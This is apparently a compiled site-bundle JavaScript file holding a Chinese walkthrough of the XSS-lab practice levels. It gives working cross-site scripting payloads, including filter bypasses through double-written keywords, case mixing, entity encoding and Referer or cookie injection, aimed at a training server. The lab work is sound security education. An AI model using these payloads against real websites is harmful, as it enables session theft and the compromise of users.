"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[6500],{81021:(i,s)=>{s.A=(i,s)=>{const a=i.__vccOpts||i;for(const[i,e]of s)a[i]=e;return a}},45866:(i,s,a)=>{a.r(s),a.d(s,{comp:()=>J,data:()=>M});var e=a(6254);const l=a.p+"assets/img/image-20240913161106-8os9zxw.a7b68e6e.png",t=a.p+"assets/img/image-20240913161610-uaet9g4.f737a4a7.png",h=a.p+"assets/img/image-20240913162704-qj7bsgr.e655a2dd.png",n=a.p+"assets/img/image-20240913163229-pns9h6c.41b72aca.png",p=a.p+"assets/img/image-20240913163736-u12vim6.89eaca9e.png",r=a.p+"assets/img/image-20240913164011-ok3g3hr.4c5841ee.png",d=a.p+"assets/img/image-20240913164736-5m1uaoa.3dcb891c.png",k=a.p+"assets/img/image-20240913164959-b1gu02b.ef316f4f.png",g=a.p+"assets/img/image-20240913165825-cue1tvc.d1e5b3a0.png",c=a.p+"assets/img/image-20240913170818-sktya4x.8b5f7deb.png",o=a.p+"assets/img/image-20240913105954-nqh3jbw.c7e36896.png",m=a.p+"assets/img/image-20240913181345-yoffzxz.ca89936a.png",v=a.p+"assets/img/image-20240913181845-yqeoiy6.18651ecf.png",b=a.p+"assets/img/image-20240913182621-4z6fmng.78131381.png",y=a.p+"assets/img/image-20240913184146-ngsz09d.acd53bb9.png",F=a.p+"assets/img/image-20240913185037-uyrrd4g.f58abce0.png",A=a.p+"assets/img/image-20240913185512-xbbjxl0.1bdaab06.png",u=a.p+"assets/img/image-20240913191348-a02bwaq.7ad14bd3.png",B=a.p+"assets/img/image-20240913191637-vsapm30.2f09de1e.png",f=a.p+"assets/img/image-20240913191929-t4v2ubx.589f5b59.png",C=a.p+"assets/img/image-20240913192538-379hk7a.6cb8aa8d.png",E=a.p+"assets/img/image-20240913222925-r5aolu9.e144fa5e.png",x=a.p+"assets/img/image-20240913222339-bwv6ji8.fd83f34f.png",z=a.p+"assets/img/image-20240913223710-2ft2x5p.2063251b.png",q=a.p+"assets/img/image-20240913221905-8ssb7i8.53aaa21d.png",S=a.p+"assets/img/image-20240913223912-7dxule2.a5a4802a.png",j=a.p+"assets/img/image-20240913222025-xvu0gbm.77c27fef.png",_=a.p+"assets/img/image-20240913224330-jv7ijmt.685c5850.png",O=a.p+"assets/img/image-20240913224444-iikv0bg.06cd97fa.png",w=a.p+"assets/img/image-20240913225001-gkjaidf.25f9978a.png",R=a.p+"assets/img/image-20240913202044-mo47p0z.d2d4fd9f.png",T=a.p+"assets/img/image-20240913213646-rpne9yf.b3a11b73.png",X=a.p+"assets/img/image-20240913214547-up0kghv.bb13ebac.png",P=a.p+"assets/img/image-20240913203324-cw701j5.c1c9c629.png",D=a.p+"assets/img/image-20240913215736-whqe6eq.35da4b46.png",U=a.p+"assets/img/image-20240913220537-d5ltkg0.70dd9df0.png",H=a.p+"assets/img/image-20240913221250-0u79wu4.f7704879.png",L=a.p+"assets/img/image-20240913205550-2yl2lx2.465b8038.png",Z={},J=(0,a(81021).A)(Z,[["render",function(i,s){return(0,e.uX)(),(0,e.CE)("div",null,s[0]||(s[0]=[(0,e.Fv)('<h1 id="xss-lab实验" tabindex="-1"><a class="header-anchor" href="#xss-lab实验"><span>XSS-lab实验</span></a></h1><h2 id="level1" tabindex="-1"><a class="header-anchor" href="#level1"><span>level1</span></a></h2><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">47.113.187.190:50974/level1.php?name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=111</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/h2&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>解析：观察URL发现是GET传参并写入H2里，所以闭合H2标签写js就可。</p><h2 id="level2" tabindex="-1"><a class="header-anchor" href="#level2"><span>level2</span></a></h2><p>观察发现值在value</p><p>​<img src="'+l+'" alt="image" loading="lazy">​</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">111</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;onclick=&#39;javascript:alert(document.cookie)&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>解析：点击输入框后触发事件</p><h2 id="level3" tabindex="-1"><a class="header-anchor" href="#level3"><span>level3</span></a></h2><p>查看值在value</p><p>​<img src="'+t+'" alt="image" loading="lazy">​</p><p>输入的&gt;被实体化</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39; onfocus=javascript:alert() &#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+n+'" alt="image" loading="lazy">​</p><h2 id="level4" tabindex="-1"><a class="header-anchor" href="#level4"><span>level4</span></a></h2><p>111&quot;&gt; 输入发现&gt;被过滤。但是闭合了</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p>payload： 点击后被触发。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">111</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot; onclick=&#39;javascript:alert()&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="level5" tabindex="-1"><a class="header-anchor" href="#level5"><span>level5</span></a></h2><p>直接输入上方payload</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">111</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot; onclick=&#39;javascript:alert()&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>on被过滤</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><p>&quot;&gt; 标签闭合了</p><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>script又被过滤了</p><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;&gt;&lt;a href=JavaScript:alert()&gt;点我&lt;/a&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="level6" tabindex="-1"><a class="header-anchor" href="#level6"><span>level6</span></a></h2><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;&gt;&lt;a href=JavaScript:alert()&gt;点我&lt;/a&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>然后href也被过滤了</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><p>payload： 虽然过滤很多 但是大小写没过滤。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;&gt;&lt;a hRef=JavaScript:alert()&gt;点我&lt;/a&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="level7" tabindex="-1"><a class="header-anchor" href="#level7"><span>level7</span></a></h2><p>经过前面过滤 <code>&quot;&gt;href script on </code>​ 总结使用这个测试，结果全被过滤了.</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payload：</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;&gt;&lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt;   那就使用双写呗</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payload：&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;a </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">hrhrefef=&quot;javascrscriptipt:alert(&#39;XSS&#39;)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">111</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">a&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><h2 id="level8" tabindex="-1"><a class="header-anchor" href="#level8"><span>level8</span></a></h2><p>&#39;&#39;&#39; href script 被过滤，大写也不行</p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><p>利用href自动Unicode解码</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payload：javascript:alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()      unicode编码后</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">106;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">97;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">118;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">97;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">115;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">99;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">114;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">105;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">112;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">116;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">58;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">97;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">108;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">101;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">114;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">116;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">40;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">41;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><h2 id="level9" tabindex="-1"><a class="header-anchor" href="#level9"><span>level9</span></a></h2><p>输入发现被URL编码</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><p><a href="http://www.runoob.com/" target="_blank" rel="noopener noreferrer">http://www.runoob.com/</a> 输入一个合法链接呢，好像可以跳转。考虑是检测到<a href="http://xn--onqr6jivo" target="_blank" rel="noopener noreferrer">http://才可以</a></p><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><p>1.会对特殊字符过滤，需要编码。</p><p>2.需要加入http://</p><p>3.js代码能执行</p><p>4.value先经过URL--&gt;后端校验--&gt;写入href</p><p>5.后端校验时不能有特殊被过滤字符（要编码），要有http://（不能被编码）</p><p>payload：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;http://</p><p>​<img src="'+F+'" alt="image" loading="lazy">​</p><p><a href="http://xn--ykq12gc10a6ee" target="_blank" rel="noopener noreferrer">http://检测到了</a>，但也被当作了js，导致js语法不对。</p><p>payload：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</p><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><h2 id="level10" tabindex="-1"><a class="header-anchor" href="#level10"><span>level10</span></a></h2><p>打开没有发现注入点，有三个被隐藏的输入框，但是不知道URL里的参数名，只有input里的name，那后端名称可能和name一样，一个个试试。</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><p>输入到第三个发现1出现在了value里。</p><p>​<img src="'+B+'" alt="image" loading="lazy">​</p><p>?t_sort=1“&gt; On hRef SCRipt 输入前面内容，&gt;被过滤，不能使用标签闭合，大写转小写，但未被过滤。</p><p>​<img src="'+f+'" alt="image" loading="lazy">​</p><p>‍</p><p>47.113.187.190:50974/level10.php?t_sort=&quot; onfocus=javascript:alert() type=&quot;display&quot;</p><p>将input框display，点击。</p><p>​<img src="'+C+'" alt="image" loading="lazy">​</p><h2 id="level11" tabindex="-1"><a class="header-anchor" href="#level11"><span>level11</span></a></h2><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">http://47.113.187.190:50974/level11.php?t_link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">t_history</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">t_sort</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot; onfocus=javascript:alert() type=&quot;display&quot;&amp;t_ref=1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>使用10中的方法来做，发现被html编码了，所以这里搞不了。所以考虑referer</p><p>​<img src="'+E+'" alt="image" loading="lazy">​</p><p>​<img src="'+x+'" alt="image" loading="lazy">​</p><p>注入成功，但是，&lt;&gt;被过滤啦。</p><p>​<img src="'+z+'" alt="image" loading="lazy">​</p><p>换个写法</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Referer:</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot; onfocus=&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">javascript:alert(</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)&quot; type=&quot;text&quot; &quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+q+'" alt="image" loading="lazy">​</p><p>看代码，注入成功。</p><p>​<img src="'+S+'" alt="image" loading="lazy">​</p><p>点击输入框执行。</p><p>​<img src="'+j+'" alt="image" loading="lazy">​</p><h2 id="level12" tabindex="-1"><a class="header-anchor" href="#level12"><span>level12</span></a></h2><p>这关就和上一关差不多了，所以直接上代码。</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot; onfocus=&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">javascript:alert(</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)&quot; type=&quot;text&quot; &quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+_+'" alt="image" loading="lazy">​</p><p>​<img src="'+O+'" alt="image" loading="lazy">​</p><h2 id="level13" tabindex="-1"><a class="header-anchor" href="#level13"><span>level13</span></a></h2><p>cookie，直接修改存储</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot; onfocus=&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">javascript:alert(</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)&quot; type=&quot;text&quot; &quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+w+'" alt="image" loading="lazy">​</p><p>​<img src="'+R+'" alt="image" loading="lazy">​</p><h2 id="level16" tabindex="-1"><a class="header-anchor" href="#level16"><span>level16</span></a></h2><p>首先，传参，发现是在center标签里放数据。</p><p>​<img src="'+T+'" alt="image" loading="lazy">​</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">http://47.113.187.190:50974/level16.php?keyword</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/center&gt;On </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">SCript</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> hREf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DaTa</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OnFocus</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OnmOuseOver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OnMouseDoWn</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> P</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">sCriP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">t&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>使用该payload测试一下，有哪些过滤。</p><p>​<img src="'+X+'" alt="image" loading="lazy">​</p><p>明显发现/、空格、被编码了，script、直接被过滤，有大小写转换。</p><p>1、&lt;&gt;没有过滤</p><p>2、不能使用scrtpt、空格要编码</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payload：?keyword\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\&lt;img%0dsrc</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1%0donerror</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">alert(1)</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&gt;</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payload：http://47.113.187.190:50974/level16.php?keyword</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;svg </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">onload=alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+P+'" alt="image" loading="lazy">​</p><h2 id="level17" tabindex="-1"><a class="header-anchor" href="#level17"><span>level17</span></a></h2><p>有一个插件</p><p>​<img src="'+D+'" alt="image" loading="lazy">​</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">?</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">arg01</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot; &#39; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02=&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img 